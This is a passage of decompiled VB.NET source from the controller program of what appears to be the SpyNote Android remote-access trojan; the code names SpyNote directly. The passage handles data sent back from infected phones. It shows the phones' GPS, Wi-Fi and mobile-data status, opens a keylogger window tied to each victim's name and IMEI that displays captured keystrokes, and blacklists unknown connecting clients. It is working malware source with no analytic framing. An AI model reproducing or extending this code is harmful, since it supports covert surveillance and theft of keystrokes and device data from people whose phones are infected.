                                                                                                                                                    Dim flag120 As Boolean = Operators.CompareString(array2(9).ToString(), "-1", False) = 0
                                                                                                                                                    If flag120 Then
                                                                                                                                                        fSettings4.BtnBarGps.Enabled = False
                                                                                                                                                    Else
                                                                                                                                                        Dim flag121 As Boolean = Operators.CompareString(array2(9).ToString(), "True", False) = 0
                                                                                                                                                        If flag121 Then
                                                                                                                                                            fSettings4.BtnBarGps.CLRNonebrd = Color.FromArgb(32, 146, 255)
                                                                                                                                                            fSettings4.BtnBarGps.CLROverbrd = Color.FromArgb(32, 146, 255)
                                                                                                                                                        Else
                                                                                                                                                            fSettings4.BtnBarGps.CLRNonebrd = Color.FromArgb(85, 85, 85)
                                                                                                                                                            fSettings4.BtnBarGps.CLROverbrd = Color.FromArgb(85, 85, 85)
                                                                                                                                                        End If
                                                                                                                                                    End If
                                                                                                                                                    fSettings4.BtnBarGps.Refresh()
                                                                                                                                                    Dim flag122 As Boolean = Operators.CompareString(array2(10).ToString(), "-1", False) = 0
                                                                                                                                                    If flag122 Then
                                                                                                                                                        fSettings4.BtnBarMobileData.Enabled = False
                                                                                                                                                    Else
                                                                                                                                                        Dim flag123 As Boolean = Operators.CompareString(array2(10).ToString(), "True", False) = 0
                                                                                                                                                        If flag123 Then
                                                                                                                                                            fSettings4.BtnBarMobileData.CLRNonebrd = Color.FromArgb(32, 146, 255)
                                                                                                                                                            fSettings4.BtnBarMobileData.CLROverbrd = Color.FromArgb(32, 146, 255)
                                                                                                                                                        Else
                                                                                                                                                            fSettings4.BtnBarMobileData.CLRNonebrd = Color.FromArgb(85, 85, 85)
                                                                                                                                                            fSettings4.BtnBarMobileData.CLROverbrd = Color.FromArgb(85, 85, 85)
                                                                                                                                                        End If
                                                                                                                                                    End If
                                                                                                                                                    fSettings4.BtnBarMobileData.Refresh()
                                                                                                                                                    Dim flag124 As Boolean = Operators.CompareString(array2(11).ToString(), "-1", False) = 0
                                                                                                                                                    If flag124 Then
                                                                                                                                                        fSettings4.BtnBarWifiConnected.Enabled = False
                                                                                                                                                    Else
                                                                                                                                                        Dim flag125 As Boolean = Operators.CompareString(array2(11).ToString(), "True", False) = 0
                                                                                                                                                        If flag125 Then
                                                                                                                                                            fSettings4.BtnBarWifiConnected.CLRNonebrd = Color.FromArgb(32, 146, 255)
                                                                                                                                                            fSettings4.BtnBarWifiConnected.CLROverbrd = Color.FromArgb(32, 146, 255)
                                                                                                                                                        Else
                                                                                                                                                            fSettings4.BtnBarWifiConnected.CLRNonebrd = Color.FromArgb(85, 85, 85)
                                                                                                                                                            fSettings4.BtnBarWifiConnected.CLROverbrd = Color.FromArgb(85, 85, 85)
                                                                                                                                                        End If
                                                                                                                                                    End If
                                                                                                                                                    fSettings4.BtnBarWifiConnected.Refresh()
                                                                                                                                                    Dim flag126 As Boolean = Operators.CompareString(array2(12).ToString(), "-1", False) = 0
                                                                                                                                                    If flag126 Then
                                                                                                                                                        fSettings4.BtnBarWifiDisconnect.Enabled = False
                                                                                                                                                    Else
                                                                                                                                                        Dim flag127 As Boolean = Operators.CompareString(array2(12).ToString(), "True", False) = 0
                                                                                                                                                        If flag127 Then
                                                                                                                                                            fSettings4.BtnBarWifiDisconnect.CLRNonebrd = Color.FromArgb(32, 146, 255)
                                                                                                                                                            fSettings4.BtnBarWifiDisconnect.CLROverbrd = Color.FromArgb(32, 146, 255)
                                                                                                                                                        Else
                                                                                                                                                            fSettings4.BtnBarWifiDisconnect.CLRNonebrd = Color.FromArgb(85, 85, 85)
                                                                                                                                                            fSettings4.BtnBarWifiDisconnect.CLROverbrd = Color.FromArgb(85, 85, 85)
                                                                                                                                                        End If
                                                                                                                                                    End If
                                                                                                                                                    fSettings4.BtnBarWifiDisconnect.Refresh()
                                                                                                                                                End If
                                                                                                                                            Else
                                                                                                                                                flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 50L), False) = 0)
                                                                                                                                                If flag5 Then
                                                                                                                                                    Dim text25 As String = "key_logger_" + socketClient.ClientName + socketClient.ClientImei
                                                                                                                                                    Dim key_logger2 As key_logger = CType(My.Application.OpenForms(text25), key_logger)
                                                                                                                                                    Dim flag128 As Boolean = key_logger2 Is Nothing
                                                                                                                                                    If flag128 Then
                                                                                                                                                        Dim flag129 As Boolean = Operators.CompareString(array2(1).Trim(), Store.BFF(Store.buff, 115L), False) = 0
                                                                                                                                                        If flag129 Then
                                                                                                                                                            Return
                                                                                                                                                        End If
                                                                                                                                                        key_logger2 = New key_logger()
                                                                                                                                                        key_logger2.Name = text25
                                                                                                                                                        key_logger2.Text = text25
                                                                                                                                                        key_logger2.Tag = text25
                                                                                                                                                        key_logger2.TClient = socketClient
                                                                                                                                                        key_logger2.Show()
                                                                                                                                                    End If
                                                                                                                                                    key_logger2.TData(New String() {array2(1).Trim(), array2(2).Trim()})
                                                                                                                                                Else
                                                                                                                                                    flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 81L), False) = 0)
                                                                                                                                                    If flag5 Then
                                                                                                                                                        Dim text26 As String = String.Concat(New String() {"AppProperties_", socketClient.ClientName, socketClient.ClientImei, Strings.Space(1), array2(3).Trim()})
                                                                                                                                                        Dim aProperties As aProperties = CType(My.Application.OpenForms(text26), aProperties)
                                                                                                                                                        Dim flag130 As Boolean = aProperties Is Nothing
                                                                                                                                                        If flag130 Then
                                                                                                                                                            aProperties = New aProperties()
                                                                                                                                                            aProperties.Name = text26
                                                                                                                                                            aProperties.Text = text26
                                                                                                                                                            aProperties.Tag = text26
                                                                                                                                                            aProperties.TClient = socketClient
                                                                                                                                                            aProperties.Show()
                                                                                                                                                        End If
                                                                                                                                                        aProperties.TData(New String() {array2(1).Trim(), array2(2).Trim()})
                                                                                                                                                    End If
                                                                                                                                                End If
                                                                                                                                            End If
                                                                                                                                        End If
                                                                                                                                    End If
                                                                                                                                End If
                                                                                                                            End If
                                                                                                                        End If
                                                                                                                    End If
                                                                                                                End If
                                                                                                            End If
                                                                                                        End If
                                                                                                    End If
                                                                                                End If
                                                                                            End If
                                                                                        End If
                                                                                    End If
                                                                                End If
                                                                            End If
                                                                        End If
                                                                    End If
                                                                End If
                                                            End If
                                                        End If
                                                    End If
                                                End If
                                            End If
                                        End If
                                    End If
                                Else
                                    socketClient.Close(True)
                                    Data.LogsSpyNote(New String() {socketClient.ClientAddressIP, socketClient.ClientRemoteAddress, "Disconnect", "Block", Nothing, "To Blacklist"})
                                    Dim flag131 As Boolean = Not Data.SpyNote.BlackList.Contains(socketClient.ClientAddressIP)
                                    If flag131 Then
                                        Data.SpyNote.BlackList.Add(socketClient.ClientAddressIP)
                                    End If
                                End If
                            End If
                        End If
                    End If
                End If
            Catch expr_4322 As Exception
            End Try
        End Sub
    End Class
End Namespace
